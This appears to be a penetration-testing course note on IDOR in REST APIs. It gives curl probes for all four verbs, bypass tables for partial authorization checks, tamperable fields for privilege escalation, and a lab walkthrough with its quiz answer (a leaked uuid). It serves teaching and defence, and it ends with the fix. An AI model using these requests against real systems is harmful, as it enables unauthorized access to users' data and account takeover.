# Section 10 — IDOR in Insecure APIs

---

## Two IDOR Categories Recap

| Category | What it does | Severity |
|----------|--------------|----------|
| **Information Disclosure** | Read another user's data | Medium-High (PII exfil) |
| **Insecure Function Calls** | Modify, create, delete on another user OR call admin-only function | High-Critical (takeover) |

REST APIs combine both — `GET` for read, `PUT/POST/DELETE` for write. If authZ is missing on any method, that method becomes the attack vector.

---

## Recognition Pattern

REST API endpoints in the form `/api/resource/{id}`:
```
GET    /api/profile/1     → read user 1
PUT    /api/profile/1     → update user 1
DELETE /api/profile/1     → delete user 1
POST   /api/profile/      → create new user
```

If the endpoint takes user input for `{id}` and the back-end doesn't verify "current user can access ID X" before each operation, every method is exploitable.

---

## Probing All Four Verbs

```bash
# Read
curl -sk "http://TARGET/api.php/profile/5"

# Update (with body)
curl -sk -X PUT "http://TARGET/api.php/profile/5" \
  -H "Content-Type: application/json" \
  -d '{"full_name": "Hacked"}'

# Create
curl -sk -X POST "http://TARGET/api.php/profile/" \
  -H "Content-Type: application/json" \
  -d '{"uid": 99, "full_name": "Hacker"}'

# Delete
curl -sk -X DELETE "http://TARGET/api.php/profile/5"
```

Compare responses for each method:
- 200 with data → IDOR
- 403/401 → authZ enforced
- 405 Method Not Allowed → server doesn't accept this verb
- 500 → may be due to missing field, not authZ — investigate

---

## Layered Validation You'll Encounter

Many APIs do **partial** authZ — they check ONE field but not others, leaving gaps:

| Check | Bypass |
|-------|--------|
| URL ID matches body `uid` | Match both: `/profile/2` + `"uid": 2` |
| `uuid` field matches user's | Read victim's profile first to get their uuid |
| `role` is in allowed list | Read existing roles via GET first, or enumerate valid values |
| Cookie role check | If cookie controls role, tamper cookie |
| Session-bound uid check | Often the only WORKING control — switching session is the bypass |

The point: each layer that exists is bypassable IF you can read enough info elsewhere (i.e., via the GET IDOR).

---

## Chain: Info Disclosure → Function Call

The pattern is:
1. GET IDOR leaks all user UUIDs, roles, emails
2. Use leaked UUID + role to satisfy validation checks on PUT/POST/DELETE
3. Combined attack succeeds where either alone would fail

This is why Information Disclosure IDORs are dangerous even if "just read-only" — they enable the actual attack against function-call APIs.

---

## Common Field Tampering

Look for fields in PUT/POST bodies that shouldn't be client-controllable:

| Field | Risk |
|-------|------|
| `role`, `is_admin`, `permissions` | Privilege escalation |
| `uid`, `user_id`, `owner_id` | Identity spoofing |
| `password`, `password_hash` | Auth bypass |
| `email` (without verification) | Account takeover via password reset |
| `is_verified`, `is_active` | Bypass moderation |
| `balance`, `credit`, `price` | Financial fraud |

Even if these aren't shown in the form, send them in your tampered request. If they're accepted, the API is insecurely accepting client-controlled fields.

---

## Lab — GET IDOR on Employee API

**Target:** `154.57.164.71:30652`

Section's writeup showed PUT/POST/DELETE all blocked by various server-side checks (uid mismatch, uuid mismatch, role check, admin-only enforcement). But the GET method had no authZ.

### Q1 — Read user 5's profile

```bash
curl -sk "http://154.57.164.71:30652/profile/api.php/profile/5"
```

Response:
```json
{
  "uid": "5",
  "uuid": "eb4fe264c10eb7a528b047aa983a4829",
  "role": "employee",
  "full_name": "Callahan Woodhams",
  "email": "c_woodhams@employees.htb",
  "about": "I don't like quoting others!"
}
```

**Q1 Answer:** `eb4fe264c10eb7a528b047aa983a4829`

> All fields disclosed — full_name, email, uuid, role. This data feeds directly into the PUT-based attack in the next section (we now have user 5's uuid, so we can satisfy the uuid-mismatch check when updating their profile).

---

## Why GET Is Often Forgotten

When devs harden an API:
- They add CSRF protection on POST/PUT/DELETE
- They add authZ checks on POST/PUT/DELETE
- They add rate limiting on writes
- They leave GET "because it's just reading"

But GET is the **enumeration primitive** that makes every other attack possible. Reading another user's record reveals the validators (uuid, role) you need to satisfy for write operations.

---

## Exam Notes

- **GET IDOR is the gateway** — even when write IDORs are mitigated, info disclosure unlocks the rest
- API endpoints `/api/resource/{id}` are prime targets — the ID is path-based, trivially modifiable
- Always test all 4 REST verbs on every endpoint — POST/PUT/DELETE often have different authZ than GET
- Layered validation (uid match + uuid match + role check) is **bypassable** when one missing check (often GET) leaks the validators
- Hidden fields in PUT/POST bodies (`role`, `is_admin`, `uid`, `permissions`) are the high-value tampering targets
- The fix: server-side authZ check on EVERY method, comparing the requester's session identity to the resource's owner
